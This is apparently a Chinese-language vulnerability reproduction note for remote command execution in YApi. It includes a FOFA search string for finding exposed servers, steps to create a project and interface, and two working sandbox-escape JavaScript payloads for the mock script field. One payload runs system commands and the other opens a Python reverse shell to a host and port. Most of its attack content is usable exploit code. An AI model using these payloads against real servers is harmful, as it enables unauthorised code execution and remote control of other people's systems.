# Yapi存在远程命令执行漏洞

# 一、漏洞简介
Yapi存在远程命令执行漏洞

# 二、影响版本
+ Yapi

# 三、资产测绘
+ fofa：`app="YApi"`
+ 特征

![1733889052543-d9462fa4-5ed8-49c3-90e0-0e22bdb0bf3d.png](./img/R4R5xyBZVQ_9RrKW/1733889052543-d9462fa4-5ed8-49c3-90e0-0e22bdb0bf3d-882788.png)

# 四、漏洞复现
注册账号登录

![1733889068979-94f17c91-b7c5-4736-b63a-ec608cf02a06.png](./img/R4R5xyBZVQ_9RrKW/1733889068979-94f17c91-b7c5-4736-b63a-ec608cf02a06-740149.png)

新建项目

![1733889103239-3d32f9de-1ae6-4668-802b-4ba25b36ede2.png](./img/R4R5xyBZVQ_9RrKW/1733889103239-3d32f9de-1ae6-4668-802b-4ba25b36ede2-659707.png)

添加接口

![1733889123950-560b7590-201a-477d-98e0-aba7da89b62a.png](./img/R4R5xyBZVQ_9RrKW/1733889123950-560b7590-201a-477d-98e0-aba7da89b62a-577318.png)

```java
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("whoami && ps -ef").toString()
```

![1733889157562-bdbc7f22-a8c2-4a3c-a54a-4203d7dd3622.png](./img/R4R5xyBZVQ_9RrKW/1733889157562-bdbc7f22-a8c2-4a3c-a54a-4203d7dd3622-586119.png)

![1733889175163-7053a924-2cc1-4bbf-9f22-18d333698b52.png](./img/R4R5xyBZVQ_9RrKW/1733889175163-7053a924-2cc1-4bbf-9f22-18d333698b52-059135.png)

![1733889186745-cec84584-2bb5-4a9f-af14-0c06944989d7.png](./img/R4R5xyBZVQ_9RrKW/1733889186745-cec84584-2bb5-4a9f-af14-0c06944989d7-172808.png)

反弹shell

```java
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
Poc = process.mainModule.require("child_process").spawnSync(
  'python', ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",6699));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']
)
```

![1733892630767-39caa4e3-fb60-405e-99ef-5c4ac2d09df8.png](./img/R4R5xyBZVQ_9RrKW/1733892630767-39caa4e3-fb60-405e-99ef-5c4ac2d09df8-057460.png)



> 更新: 2024-12-20 14:53:54  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zwurnkdpoozs08fc>